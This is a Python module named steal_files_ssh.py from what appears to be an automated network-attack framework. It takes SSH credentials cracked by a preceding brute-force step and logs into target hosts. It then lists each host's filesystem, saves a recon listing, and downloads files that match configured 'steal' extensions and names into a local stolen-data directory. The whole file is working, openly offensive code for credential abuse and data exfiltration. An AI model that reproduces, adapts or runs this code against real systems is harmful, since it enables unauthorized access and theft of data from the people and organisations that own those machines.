"""
steal_files_ssh.py - This script connects to remote SSH servers using provided credentials, searches for specific files, and downloads them to a local directory.
"""

import os
import paramiko
import logging
import time
from shared import SharedData
from logger import Logger
from timeout_utils import TimeoutContext

# Configure the logger
logger = Logger(name="steal_files_ssh.py", level=logging.INFO)

# Define the necessary global variables
b_class = "StealFilesSSH"
b_module = "steal_files_ssh"
b_status = "steal_files_ssh"
b_parent = "SSHBruteforce"
b_port = 22

class StealFilesSSH:
    """
    Class to handle the process of stealing files from SSH servers.
    """
    def __init__(self, shared_data):
        try:
            self.shared_data = shared_data
            self.ssh_connected = False  # Set when SSH connects (before SFTP)
            self.stop_execution = False
            self.b_parent_action = "brute_force_ssh"  # Parent action status key
            logger.info("StealFilesSSH initialized")
        except Exception as e:
            logger.error(f"Error during initialization: {e}")

    def connect_ssh(self, ip, username, password, max_retries=3, retry_delay=10):
        """
        Establish an SSH connection with 30 second timeout.
        Includes retry logic for rate-limited connections (banner read errors).
        """
        last_error = None
        for attempt in range(max_retries):
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=username, password=password,
                           timeout=30, banner_timeout=30, auth_timeout=30)
                self.ssh_connected = True  # Mark SSH as connected
                logger.info(f"Connected to {ip} via SSH with username {username}")
                return ssh
            except Exception as e:
                last_error = e
                error_msg = str(e).lower()
                # Retry on banner/timeout errors (server likely rate-limiting)
                if 'banner' in error_msg or 'timeout' in error_msg or 'timed out' in error_msg:
                    if attempt < max_retries - 1:
                        logger.warning(f"SSH connection to {ip} failed (attempt {attempt + 1}/{max_retries}): {e}. Retrying in {retry_delay}s...")
                        time.sleep(retry_delay)
                        continue
                # Don't retry on auth errors
                logger.error(f"Error connecting to SSH on {ip} with username {username}: {e}")
                raise
        logger.error(f"SSH connection to {ip} failed after {max_retries} attempts: {last_error}")
        raise last_error

    def save_file_listing(self, ip, mac, files, protocol="ssh"):
        """
        Save the complete file listing to a recon file for later analysis.
        """
        try:
            recon_dir = os.path.join(self.shared_data.datastolendir, "recon", "file_listings")
            os.makedirs(recon_dir, exist_ok=True)
            listing_file = os.path.join(recon_dir, f"{protocol}_{mac}_{ip}_files.txt")
            with open(listing_file, 'w') as f:
                f.write(f"# File listing for {ip} via {protocol.upper()}\n")
                f.write(f"# Total files discovered: {len(files)}\n")
                f.write(f"# Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("#" + "=" * 60 + "\n")
                for file in sorted(files):
                    f.write(f"{file}\n")
            logger.info(f"Saved file listing ({len(files)} files)")
        except Exception as e:
            logger.error(f"Error saving file listing: {e}")

    def find_files(self, ssh, dir_path, ip=None, mac=None):
        """
        Find files in the remote directory based on the configuration criteria.
        Uses timeout on exec_command. Saves full file listing to recon directory.
        """
        try:
            # Exclude virtual filesystems (proc/sys/dev) which have thousands of kernel files
            stdin, stdout, stderr = ssh.exec_command(f'find {dir_path} -maxdepth 5 -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null', timeout=60)
            # Read with timeout using channel
            stdout.channel.settimeout(60)
            files = stdout.read().decode().splitlines()

            # Save complete file listing for recon
            if ip and mac and files:
                self.save_file_listing(ip, mac, files, "ssh")

            logger.info(f"Discovered {len(files)} total files on {ip or 'target'}")

            # Pre-compile pattern sets for faster matching
            steal_extensions = set(self.shared_data.steal_file_extensions)
            steal_names = set(self.shared_data.steal_file_names)
            path_patterns = [fn for fn in steal_names if fn.startswith('/')]
            name_patterns = [fn for fn in steal_names if not fn.startswith('/')]

            matching_files = []
            for i, file in enumerate(files):
                # Check for exit every 1000 files instead of every file
                if i % 1000 == 0 and (self.shared_data.orchestrator_should_exit or self.stop_execution):
                    logger.info(f"File filtering interrupted at {i}/{len(files)} files.")
                    break
                basename = os.path.basename(file)
                # Match by extension
                if any(file.endswith(ext) for ext in steal_extensions):
                    matching_files.append(file)
                # Match by path pattern (ends with /pattern)
                elif any(file.endswith(fn) for fn in path_patterns):
                    matching_files.append(file)
                # Match by basename
                elif basename in name_patterns:
                    matching_files.append(file)
            logger.info(f"Found {len(matching_files)} matching files to steal in {dir_path}")
            return matching_files
        except Exception as e:
            logger.error(f"Error finding files in directory {dir_path}: {e}")
            raise

    def steal_file(self, ssh, remote_file, local_dir):
        """
        Download a file from the remote server to the local directory.
        Returns True on success, False on failure.
        """
        try:
            sftp = ssh.open_sftp()
            remote_dir = os.path.dirname(remote_file)
            local_file_dir = os.path.join(local_dir, os.path.relpath(remote_dir, '/'))
            os.makedirs(local_file_dir, exist_ok=True)
            local_file_path = os.path.join(local_file_dir, os.path.basename(remote_file))
            sftp.get(remote_file, local_file_path)
            logger.success(f"Downloaded: {remote_file}")
            sftp.close()
            return True
        except Exception as e:
            logger.error(f"Error stealing file {remote_file}: {e}")
            return False

    def execute(self, ip, port, row, status_key):
        """
        Steal files from the remote server using SSH.
        """
        # Reset state from any previous runs
        self.stop_execution = False
        self.ssh_connected = False

        start_time = time.time()
        logger.lifecycle_start("StealFilesSSH", ip, port)
        try:
            if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
                self.shared_data.bjornorch_status = "StealFilesSSH"
                logger.info(f"Stealing files from {ip}:{port}...")

                # Get SSH credentials from the cracked passwords file
                sshfile = self.shared_data.sshfile
                credentials = []
                if os.path.exists(sshfile):
                    with open(sshfile, 'r') as f:
                        lines = f.readlines()[1:]  # Skip the header
                        for line in lines:
                            line = line.strip()
                            if not line:  # Skip empty lines
                                continue
                            parts = line.split(',')
                            if len(parts) >= 5 and parts[1] == ip:
                                credentials.append((parts[3], parts[4]))
                    logger.info(f"Found {len(credentials)} credentials for {ip}")

                if not credentials:
                    logger.error(f"No valid credentials found for {ip}. Skipping...")
                    duration = time.time() - start_time
                    logger.lifecycle_end("StealFilesSSH", 'failed', duration, ip)
                    return 'failed'

                def handle_timeout():
                    """
                    Timeout handler to stop the execution if no SSH connection is established.
                    """
                    if not self.ssh_connected:
                        logger.lifecycle_timeout("StealFilesSSH", "SSH connection", 240, ip)
                        self.stop_execution = True

                # Use TimeoutContext instead of Timer(240)
                with TimeoutContext(timeout=240, on_timeout=handle_timeout) as timeout_ctx:
                    # Attempt to steal files using each credential
                    success = False
                    for username, password in credentials:
                        if timeout_ctx.should_stop or self.stop_execution or self.shared_data.orchestrator_should_exit:
                            logger.info("File search interrupted.")
                            break
                        try:
                            logger.info(f"Trying credential {username}:{password} for {ip}")
                            ssh = self.connect_ssh(ip, username, password)
                            mac = row['MAC Address']
                            remote_files = self.find_files(ssh, '/', ip, mac)
                            local_dir = os.path.join(self.shared_data.datastolendir, f"ssh/{mac}_{ip}")
                            if remote_files:
                                stolen_count = 0
                                for remote_file in remote_files:
                                    if timeout_ctx.should_stop or self.stop_execution or self.shared_data.orchestrator_should_exit:
                                        logger.info("File search interrupted.")
                                        break
                                    if self.steal_file(ssh, remote_file, local_dir):
                                        stolen_count += 1
                                if stolen_count > 0:
                                    success = True
                                    logger.success(f"Successfully stolen {stolen_count}/{len(remote_files)} files from {ip}:{port} using {username}")
                            ssh.close()
                            if success:
                                duration = time.time() - start_time
                                logger.lifecycle_end("StealFilesSSH", 'success', duration, ip)
                                return 'success'  # Return success if the operation is successful
                        except Exception as e:
                            logger.error(f"Error stealing files from {ip} with username {username}: {e}")

                # Ensure the action is marked as failed if no files were found
                if not success:
                    logger.error(f"Failed to steal any files from {ip}:{port}")
                    duration = time.time() - start_time
                    logger.lifecycle_end("StealFilesSSH", 'failed', duration, ip)
                    return 'failed'
            else:
                logger.error(f"Parent action not successful for {ip}. Skipping steal files action.")
                duration = time.time() - start_time
                logger.lifecycle_end("StealFilesSSH", 'skipped', duration, ip)
                return 'failed'
        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            duration = time.time() - start_time
            logger.lifecycle_end("StealFilesSSH", 'failed', duration, ip)
            return 'failed'

if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_ssh = StealFilesSSH(shared_data)
        # Add test or demonstration calls here
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
